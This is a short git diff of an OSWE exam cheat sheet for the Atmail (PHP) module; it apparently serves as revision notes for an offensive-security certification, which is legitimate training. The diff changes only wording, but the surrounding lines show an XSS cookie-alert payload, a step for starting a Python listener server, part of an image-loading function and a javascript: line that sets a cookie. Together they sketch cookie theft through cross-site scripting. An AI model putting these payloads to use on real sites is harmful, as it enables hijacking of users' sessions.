@@ -3,7 +3,7 @@ OSWE-cheat sheet module by module short notes for quick revision for exam:
 
 Module : Atmail (PHP):
 
-1. Access and alert cookie payload (Httponly flag should be disable in set-Cookie headers)<br>
+1. Access and alert cookie (Httponly flag should be disable in set-Cookie headers)<br>
     <script>alert(document.cookie);</script>
     
 2. Run Python Server in python3<br>
@@ -17,7 +17,7 @@ Module : Atmail (PHP):
     }<br>
     addImage();<br>
     
-4. Set cookie by web developer console<br>
+4. Set cookie in web developer console<br>
     javascript:void(document.cookie="cookiename=value");
  
 5. XHR POST Request <br>
